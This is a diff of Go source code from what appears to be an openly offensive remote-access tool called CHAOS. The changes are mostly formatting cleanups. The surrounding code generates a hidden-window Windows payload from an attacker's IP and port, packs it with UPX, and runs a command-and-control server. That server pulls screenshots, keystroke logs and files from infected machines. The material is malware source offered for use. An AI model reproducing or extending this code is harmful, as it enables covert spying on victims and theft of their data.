@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -14,7 +15,6 @@ import (
 	"os/exec"
 	"runtime"
 	"time"
-	"bytes"
 )
 
 const (
@@ -118,32 +118,32 @@ func Encrypt(Key []byte, PlainCode []byte) string {
 	return base64.URLEncoding.EncodeToString(CipherCode)
 }
 
-func getDateTime() string{
+func getDateTime() string {
 	currentTime := time.Now()
-  	// https://golang.org/pkg/time/#example_Time_Format
-  	return currentTime.Format("2006-01-02-15-04-05")
+	// https://golang.org/pkg/time/#example_Time_Format
+	return currentTime.Format("2006-01-02-15-04-05")
 }
 
-func TemplateTextReplace(ParamOne string, ParamTwo string, ParamThree string, ParamFour string, ParamFive string){
+func TemplateTextReplace(ParamOne string, ParamTwo string, ParamThree string, ParamFour string, ParamFive string) {
 	input, err := ioutil.ReadFile("Template_CHAOS.go")
 
 	if err != nil {
-    fmt.Println(RED, "[!] Error to replace template!")
+		fmt.Println(RED, "[!] Error to replace template!")
 		os.Exit(1)
-  	}
+	}
 
-  	output := bytes.Replace(input, []byte("IPAddress"), []byte(string(ParamOne)), -1)
-  	output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ParamTwo)), -1)
-  	output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(ParamThree)), -1)
-  	output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(ParamFour)), -1)
+	output := bytes.Replace(input, []byte("IPAddress"), []byte(string(ParamOne)), -1)
+	output = bytes.Replace(output, []byte("ServerPort"), []byte(string(ParamTwo)), -1)
+	output = bytes.Replace(output, []byte("FileNameCHAOS"), []byte(string(ParamThree)), -1)
+	output = bytes.Replace(output, []byte("NameFolderExtesion"), []byte(string(ParamFour)), -1)
 
-	if err = ioutil.WriteFile(ParamFive + ".go", output, 0666); err != nil {
+	if err = ioutil.WriteFile(ParamFive+".go", output, 0666); err != nil {
 		fmt.Println(RED, "[!] Error to write template!")
 		os.Exit(1)
 	}
 }
 
-func ServeFiles(){
+func ServeFiles() {
 	go exec.Command("sh", "-c", "xterm -e \"go run Serve.go\"").Output()
 }
 
@@ -232,15 +232,14 @@ func GenerateCode() {
 	}
 
 	pathPersistence := GeneratePath(8)
-	NAME = NAME + getDateTime()
 
-	TemplateTextReplace(string(LHOST), string(LPORT), string(NAME + ".exe"), string(pathPersistence), string(NAME))
+	TemplateTextReplace(string(LHOST), string(LPORT), string(NAME+".exe"), string(pathPersistence), string(NAME))
 
 	fmt.Println("")
 	fmt.Println(GREEN, "[*] Compiling...")
-	exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" "+string(NAME) + ".go").Output()
+	exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" "+string(NAME)+".go").Output()
 
-	fmt.Println(GREEN, "[*] Generated \"" + string(NAME) + ".exe\"")
+	fmt.Println(GREEN, "[*] Generated \""+string(NAME)+".exe\"")
 	fmt.Println("")
 
 	fmt.Print(YELLOW, "Compress the payload with UPX? (y/N): ", WHITE)
@@ -249,7 +248,7 @@ func GenerateCode() {
 		UPX = "n"
 	}
 	if UPX == "y" || UPX == "Y" {
-		UPXOUT, _ := exec.Command("sh", "-c", "upx --force " + string(NAME) + ".exe").Output()
+		UPXOUT, _ := exec.Command("sh", "-c", "upx --force "+string(NAME)+".exe").Output()
 		fmt.Println("")
 		fmt.Println(string(UPXOUT))
 		WaitTime(5)
@@ -363,11 +362,11 @@ func RunServer() {
 			fmt.Println(YELLOW, "-> Getting ScreenShot...")
 			decData, _ := base64.URLEncoding.DecodeString(encData)
 
-			ioutil.WriteFile(string(outputName) + ".png", []byte(decData), 777)
+			ioutil.WriteFile(string(outputName)+".png", []byte(decData), 777)
 
-			out, err := exec.Command("sh", "-c", "eog " + string(outputName) + ".png").Output()
+			out, err := exec.Command("sh", "-c", "eog "+string(outputName)+".png").Output()
 			if err != nil {
-		    	fmt.Printf("%s", err)
+				fmt.Printf("%s", err)
 			}
 			fmt.Printf("%s", out)
 
@@ -376,7 +375,7 @@ func RunServer() {
 			conn.Write([]byte(klgListen + "\n"))
 			message, _ := bufio.NewReader(conn).ReadString('\n')
 			decoded, _ := base64.StdEncoding.DecodeString(message)
-			fmt.Print(YELLOW, string(decoded) + "\n")
+			fmt.Print(YELLOW, string(decoded)+"\n")
 
 		case "keylogger show":
 			klgShow := base64.URLEncoding.EncodeToString([]byte("keylogger show"))
@@ -401,7 +400,7 @@ func RunServer() {
 
 			fmt.Println(YELLOW, "-> Downloading...")
 			decData, _ := base64.URLEncoding.DecodeString(encData)
-			ioutil.WriteFile(string(outputName) + getDateTime(), []byte(decData), 777)
+			ioutil.WriteFile(string(outputName)+getDateTime(), []byte(decData), 777)
 
 		case "upload":
 			encUpload := base64.URLEncoding.EncodeToString([]byte("upload"))
